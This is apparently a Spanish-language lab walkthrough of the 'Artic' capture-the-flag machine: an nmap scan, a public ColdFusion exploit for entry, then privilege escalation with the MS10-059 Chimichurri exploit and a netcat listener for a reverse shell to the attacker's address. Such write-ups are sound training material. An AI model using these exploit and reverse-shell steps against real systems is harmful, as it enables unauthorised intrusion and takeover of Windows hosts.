

```bash
# Nmap 7.95 scan initiated Wed Jun  4 09:39:51 2025 as: /usr/lib/nmap/nmap --privileged -sCV --min-rate 5000 -v -Pn -oN Artic.txt 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.043s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  4 09:42:28 2025 -- 1 IP address (1 host up) scanned in 157.05 seconds
```


vemos que encontramos una aplicacion de Coldfusion

![[Pasted image 20250604094831.png]]

buscamos exploit para esto

vemos que tenemos esto
https://www.exploit-db.com/exploits/50057


lo usamos y estamos dentro
![[Pasted image 20250604094916.png]]

ejecutamos windows exploit suggester


![[Pasted image 20250604123502.png]]

vemos que tenemos unas cuantas, despues de investigar, vemos que tenemos que MS10-059


descargamos el exploit y lo pasamos a la maquina



```bash
Chimichurri.exe 10.10.14.20 8080
```

```
nc -nlvp 8080
```

![[Pasted image 20250604123713.png]]